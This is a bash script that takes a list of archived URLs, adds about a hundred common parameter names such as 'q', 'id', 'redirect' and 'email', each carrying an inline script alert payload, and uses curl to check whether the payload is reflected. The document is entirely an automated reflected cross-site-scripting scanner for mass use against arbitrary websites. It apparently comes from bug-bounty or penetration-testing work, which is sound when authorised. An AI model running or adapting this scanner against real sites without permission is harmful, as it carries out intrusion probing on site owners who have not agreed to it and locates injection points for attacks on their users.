#!/bin/bash

# Check if input file is provided
if [ -z "$1" ]; then
  echo "Usage: $0 <waybackurls_file>"
  exit 1
fi

input_file=$1

# List of dorks
dorks=(
  "s"
  "q"
  "search"
  "id"
  "lang"
  "keyword"
  "query"
  "page"
  "keywords"
  "year"
  "view"
  "email"
  "type"
  "name"
  "p"
  "month"
  "immagine"
  "list_type"
  "url"
  "terms"
  "categoryid"
  "key"
  "l"
  "begindate"
  "enddate"
  "categoryid2"
  "t"
  "cat"
  "category"
  "action"
  "bukva"
  "redirect_uri"
  "firstname"
  "c"
  "lastname"
  "uid"
  "startTime"
  "eventSearch"
  "categoryids2"
  "categoryids"
  "sort"
  "positiontitle"
  "groupid"
  "m"
  "message"
  "tag"
  "pn"
  "title"
  "orgId"
  "text"
  "handler"
  "myord"
  "myshownums"
  "id_site"
  "city"
  "search_query"
  "msg"
  "sortby"
  "produkti_po_cena"
  "produkti_po_ime"
  "mode"
  "CODE"
  "location"
  "v"
  "order"
  "n"
  "term"
  "start"
  "k"
  "redirect"
  "ref"
  "file"
  "mebel_id"
  "country"
  "from"
  "r"
  "f"
  "field%5B%5D"
  "searchScope"
  "state"
  "phone"
  "Itemid"
  "lng"
  "place"
  "bedrooms"
  "expand"
  "e"
  "price"
  "d"
  "path"
  "address"
  "day"
  "display"
  "a"
  "error"
  "form"
  "language"
  "mls"
  "kw"
  "u"
)

# XSS payload
xss_payload="<script>alert('XSS')</script>"

# Function to check for reflection
check_reflection() {
  url=$1
  param=$2
  payload="${url}?${param}=${xss_payload}"

  response=$(curl -s "$payload")
  if echo "$response" | grep -q "$xss_payload"; then
    echo "Reflection found for parameter: $param"
    echo "Payload URL: $payload"
  else
    echo "No reflection for parameter: $param"
  fi
}

# Process each URL from the input file
while IFS= read -r url; do
  for dork in "${dorks[@]}"; do
    check_reflection "$url" "$dork"
  done
done < "$input_file"

echo "XSS dork testing completed."
